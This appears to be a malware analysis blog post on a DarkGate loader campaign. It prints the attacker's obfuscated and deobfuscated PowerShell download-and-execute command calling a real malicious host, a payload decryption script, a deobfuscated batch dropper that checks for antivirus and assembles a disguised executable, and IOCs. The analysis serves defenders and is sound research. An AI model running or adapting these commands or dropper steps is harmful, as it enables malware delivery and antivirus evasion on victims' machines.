---
title: "Darkgate Campaign"
date: 2025-11-29
categories: [Malware Analysis]
tags: [Malware Analysis]
image: assets/logo/ida-ascii-art.png
---

---

# Introduction

DarkGate is a modular loader and botnet toolkit first observed in 2017 that enables operators to fully compromise victim hosts, persist, drop secondary payloads, and provide remote access and data exfiltration capabilities

## Executive Summary

An obfuscated PowerShell downloader that constructs and executes a remote command to fetch `NoBu.obb`. Static inspection of `NoBu.obb` revealed randomized variable names, a large Base64 blob and decryption that using AES-CBC (with padding). The decrypted output is dropped to the host TEMP directory and executed.

![](https://www.notion.so/image/attachment%3A50cd2a98-4095-4e6b-8e36-94aa84260def%3Aimage.png?table=block&id=28e26e60-5e7e-80e0-850c-d6af3b63fa7c&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1600&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

A classic staging technique used to evade detection and deliver a secondary payload. Post-execution behavior matches DarkGate loader/botnet activity. The host is prepared for persistence, secondary modules are unpacked and launched, and the implant attempts to establish outbound connections to attacker controlled infrastructure.

## Initial Observation

An obfuscated PowerShell invocation was discovered on the host. The command using quoted fragments to construct and invoke a remote command via `iex` and `Invoke-RestMethod` to avoid EDR detection:

```
POwERShelL -"W" h -"CoMMaN"d "i"ex" (irm  "h"tt"ps://z"3"n.f"un/N"o"Bu.ob"b)"
```

After deobfuscation the command should be something like this below:

```
PowerShell -WindowStyle Hidden -Command "iex (irm 'https://z3n.fun/NoBu.obb')"
```

the powershell attempts to download and execute content from `hxxps[://]z3n[.]fun/NoBu.obb`

Analysis of `NoBu.obb` reveals an obfuscated script (randomized variable names) that decodes a Base64 blob, decrypts it using **AES-CBC** with padding, and drops the resulting file to the system **TEMP** directory.

![](https://www.notion.so/image/attachment%3A869f99e4-9735-481f-b0d1-d7bc0eca2bc2%3Aimage.png?table=block&id=28e26e60-5e7e-8069-a4da-d560615a6014&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## Decoding Process

Python script below is a development process to replicate the original script’s behavior by extracting and decrypting its embedded content:

```
import base64
from Crypto.Cipher import AES

key_b64 = "5xTK9HCPrbLHtHKnhoUTy1aKGQ/x8DX53c9K64dEI1E="
iv_b64 = "Yd8Pupt4L/vjrfixEsO0RQ=="
content_b64 = "S0EN+7DbqvoT8c4...<STRIP>...9GQ=="

key = base64.b64decode(key_b64)
iv = base64.b64decode(iv_b64)
ciphertext = base64.b64decode(content_b64)

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)

# Remove PKCS7 padding
pad_len = decrypted[-1]
plaintext = decrypted[:-pad_len]

with open("unknown", "wb") as f:
    f.write(plaintext)
```

extracting and checking the hash:

```

λ python decrypt.py
λ file unknown
sus.txt: Zip archive data, at least v2.0 to extract

λ unzip unknown
Archive:  unknown
  inflating: SheetsToo.exe

λ md5sum SheetsToo.exe
f3edd221d30ee029f97b10e06b9162ba *SheetsToo.exe
```

checking the hash on virus total. 33/70 flagged as malicious and family label was under darkgate:

![](https://www.notion.so/image/attachment%3Adad4e8a4-9296-47f9-92ce-1c16dba07c38%3Aimage.png?table=block&id=28e26e60-5e7e-80bb-9879-c5f2b0b3a813&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

# Reverse Engineering

## Static Analysis

checking the file type:

```
λ file SheetsToo.exe
SheetsToo.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

checking the program (using detect it easy). it detect as 32bit program.

![](https://www.notion.so/image/attachment%3A9620a82a-d1ba-49c7-a490-07d20849bb6c%3Aimage.png?table=block&id=28e26e60-5e7e-80e9-b7c0-c0ca0ebe70cd&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

some command inside while checking the string in the program:

![](https://www.notion.so/image/attachment%3A67e7d77e-6301-4cbb-b3c8-6983f8f232a9%3Aimage_(5).png?table=block&id=28e26e60-5e7e-80f7-a94b-cb321ee5e159&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## Dynamic Analysis

process running and checked using process monitor(procmon):

![](https://www.notion.so/image/attachment%3A04ae886e-5f80-4436-b311-2681e7652b5f%3Aimage_(6).png?table=block&id=28e26e60-5e7e-8004-bc79-c6dc195406b3&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

dropped file and one folder of `392951`:

![](https://www.notion.so/image/attachment%3A5ad61fdc-38c2-4f75-9e78-adae1c718648%3Aimage_(7).png?table=block&id=28e26e60-5e7e-8031-8e07-ceb57a615be3&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

entering `Nebraska.wbk.bat`. it set certain character into word. thats the obfuscate methodology of it:

![](https://www.notion.so/image/attachment%3A27ebb167-649b-424a-ac5f-62e452e4ca40%3Aimage.png?table=block&id=28e26e60-5e7e-806d-b0ea-d5e69942f873&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## Deobfuscation

Extracting only important word and removing the unknown character and word would be like this below:

```
Set Referral=c
Set Combinations=U
Set B=G
Set Internet=m
Set Tu=I
Set Appear=W
Set Milf=Q
Set Nut=S
Set Vegetables=l
Set Collection=4
Set Bacterial=k
Set Fresh=B
Set Failed=a
Set Crew=C
Set Nearly=.
Set Professor=3

%Nut%et s%Appear%r%B%%Nut%%Nut%V=Rep%Vegetables%i%Referral%%Failed%%Nearly%s%Referral%r
%Nut%et %Crew%JXw%Referral%JXtuAVds%Failed%%Referral%sY%Crew%L%Appear%bVqjX%Milf%Ysg%Referral%%B%J%Bacterial%%Internet%Xd%Failed%= 
%Nut%et q%Tu%Af%Internet%XMxON%Internet%v%Internet%qdsXqrbTqv%Crew%n%Fresh%%B%bYitg=5
t%Failed%s%Bacterial%%Vegetables%ist | findstr "bdservi%Referral%ehost e%Bacterial%rn Av%Failed%st%Combinations%%Tu% %Nut%ophosHe%Failed%%Vegetables%th AV%B%%Combinations%%Tu% ns%Appear%s%Referral%%Nut%v%Referral%"  & if not error%Vegetables%eve%Vegetables% 1 %Nut%et s%Appear%r%B%%Nut%%Nut%V=Auto%Tu%t%Professor%%Nearly%exe & %Nut%et %Crew%JXw%Referral%JXtuAVds%Failed%%Referral%sY%Crew%L%Appear%bVqjX%Milf%Ysg%Referral%%B%J%Bacterial%%Internet%Xd%Failed%=%Nearly%%Failed%u%Professor% & %Nut%et q%Tu%Af%Internet%XMxON%Internet%v%Internet%qdsXqrbTqv%Crew%n%Fresh%%B%bYitg=287
%Nut%et /%Failed% Free=%Professor%92951
%Internet%d %Free%
st%Failed%rt /w%Failed%it extr%Failed%%Referral%%Professor%2 /Y V%Nearly%wb%Bacterial% *%Nearly%*
set /p ="MZ" > %Free%\%sWrGSSV% <nu%Vegetables%
findstr /V "Kit%Referral%hen" %Appear%hy >> %Free%\%sWrGSSV%
%Referral%opy /b /y %Free%\%sWrGSSV% + Definitions + D%Failed%ughters + He%Failed%vi%Vegetables%y + %Nut%oftb%Failed%%Vegetables%%Vegetables% + Jord%Failed%n + Lo%Vegetables%it%Failed% + Forest + Ap%Failed%rt%Internet%ent + %Nut%urprising + %Tu%nternship + Additions %Free%\%sWrGSSV%
%Referral%d %Free%
%Referral%opy /b /y %Nearly%%Nearly%\%Appear%et%Nearly%wb%Bacterial% + %Nearly%%Nearly%\%Nut%%Referral%reening%Nearly%wb%Bacterial% + %Nearly%%Nearly%\Down%Vegetables%o%Failed%ding%Nearly%wb%Bacterial% R%CJXwcJXtuAVdsacsYCLWbVqjXQYsgcGJkmXda%
%sWrGSSV% R%CJXwcJXtuAVdsacsYCLWbVqjXQYsgcGJkmXda%
%Referral%d %Nearly%%Nearly%
w%Failed%itfor /T %qIAfmXMxONmvmqdsXqrbTqvCnBGbYitg% q%Tu%Af%Internet%XMxON%Internet%v%Internet%qdsXqrbTqv%Crew%n%Fresh%%B%bYitg
```

fully decode of the deobfuscate:

```
Set sWraGGSV=Replica.scr
Set CJXwcJXtuAVdsacsYCLWbVqjXQYsgcGJkmXda=
Set qIAmXmXMxONmvmqdsXqrbTqvCnBGbYitg=5
tasklist | findstr "bdservicehost ekrn AvastUI SophosHealth AVGUI nsWscSvc" & if not errorlevel 1 (
    Set sWraGGSV=AutoIt3.exe
    Set CJXwcJXtuAVdsacsYCLWbVqjXQYsgcGJkmXda=.au3
    Set qIAmXmXMxONmvmqdsXqrbTqvCnBGbYitg=287
)
Set /a %Free%=392951
md 392951
start /wait extrac3 /Y V.k *.*
set /p ="MZ" > 392951\Replica.scr <nul
findstr /V "Kitchen" Why >> 392951\Replica.scr
copy /b /y 392951\Replica.scr + Definitions + Daughters + Heavy + Softball + Jordan + Lolita + Forest + Apartment + Surprising + Internship + Additions 392951\Replica.scr
cd 392951
copy /b /y ..\Wet.wbk + ..\Screening.wbk + ..\Downloading.wbk RCJXwcJXtuAVdsacsYCLWbVqjXQYsgcGJkmXda
Replica.scr RCJXwcJXtuAVdsacsYCLWbVqjXQYsgcGJkmXda
cd ..
waitfor /T 287 qIAmXmXMxONmvmqdsXqrbTqvCnBGbYitg
```

## Behavior Analysis

re-simulate:

```
λ copy /b /y ..\Wet.wbk + ..\Screening.wbk + ..\Downloading.wbk R.au3
..\Wet.wbk
..\Screening.wbk
..\Downloading.wbk
        1 file(s) copied.
```

![](https://www.notion.so/image/attachment%3A4ba7589c-82a8-4d2e-ac00-be353d3c0fa3%3Aimage.png?table=block&id=28e26e60-5e7e-807c-8335-cc08b104deb0&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

when trying to run it try to execute the C2 connection:

```
λ ./Replica.scr R.au3
```

the C2 trying to connect it:

![](https://www.notion.so/image/attachment%3Ac78c3411-6a99-49a1-ba08-0abed41b8914%3Aimage.png?table=block&id=28e26e60-5e7e-80ce-9f71-d9c6668e905a&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

when check back at the virustotal the dns was the same:

![](https://www.notion.so/image/attachment%3Aec69cdf3-3dfd-4695-aaa0-0e4f994dbc41%3Aimage.png?table=block&id=28e26e60-5e7e-800c-b2d5-f684ab79eff1&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

# Indicator of Compromised

| IOC | Type | File Name |
| --- | --- | --- |
| FmYHjjXUeGKckCRHHxEDWmWbkdx\[.\]FmYHjjXUeGKckCRHHxEDWmWbkdx | URL/Domain | - |
| hxxps\[://\]z3n\[.\]fun/NoBu.obb | URL | - |
| f3edd221d30ee029f97b10e06b9162ba | Hash (MD5) | SheetsToo.exe |
| 5cbed68c61747e7db892f00e507a4dd6 | Hash (MD5) | r.au3 |
| f589c1095824c52a5ed3625d0d851b22 | Hash (MD5) | Replica.scr |
| 188f4fb7f5d742b82224da0e7c54bcab | Hash (MD5) | Nebraska.wbk.bat |
| 796104eddb3e7137abbbd5c3cb55fb6c | Hash (MD5) | NoBu.obb |
| d019fcb03782d699af6b1d98f6193e38 | Hash (MD5) | temp<random\_number>.zip |
